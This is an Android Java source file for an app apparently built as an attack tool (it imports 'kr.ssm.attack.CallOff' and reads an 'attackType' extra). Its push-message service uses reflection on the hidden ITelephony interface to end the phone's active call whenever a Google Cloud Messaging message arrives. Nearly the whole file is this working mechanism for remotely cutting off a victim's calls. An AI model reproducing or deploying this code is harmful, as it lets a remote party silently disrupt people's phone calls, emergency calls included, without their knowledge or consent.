package kr.ewhapp.kjw.bunobuno.gcm;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import kr.ssm.attack.CallOff;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.internal.telephony.ITelephony;
import com.google.android.gms.gcm.GoogleCloudMessaging;

public class GCMIntentService extends IntentService {

	private Context context;

	public GCMIntentService() {
		super("GCMIntentService");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		Bundle extras = intent.getExtras();
		String attackType = intent.getStringExtra("message");
		GoogleCloudMessaging gcm = GoogleCloudMessaging.getInstance(this);
		String gcmMessageType = gcm.getMessageType(intent);

		if (!extras.isEmpty()) {

			if (GoogleCloudMessaging.MESSAGE_TYPE_SEND_ERROR.equals(gcmMessageType)) {
				Log.i("GCMIntentService", "Send error: " + extras.toString());
			} else if (GoogleCloudMessaging.MESSAGE_TYPE_DELETED.equals(gcmMessageType)) {
				Log.i("GCMIntentService", "Deleted messages on server: " + extras.toString());
			} else if (GoogleCloudMessaging.MESSAGE_TYPE_MESSAGE.equals(gcmMessageType)) {
				Log.i("QQQ","CCCCC");
//				Log.i("QQQQQQQQQQ",attackType);
//				CallOff co = new CallOff(context);
//				co.callOff();
				TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

				try {
					Class c = Class.forName(tm.getClass().getName());
					Method m = c.getDeclaredMethod("getITelephony");
					m.setAccessible(true);
					Log.i("AAAA", m.getName() + " ");
					ITelephony telePhonyService = (ITelephony) m.invoke(tm);

					telePhonyService.endCall();
				} catch (ClassNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (NoSuchMethodException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalArgumentException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InvocationTargetException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (RemoteException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else {
				Log.i("!!!!!!!!!!!!!!!!", "AAAAAAAAAAAAAAAAA");
			}

		}
		GCMBroadcastReceiver.completeWakefulIntent(intent);
	}
}
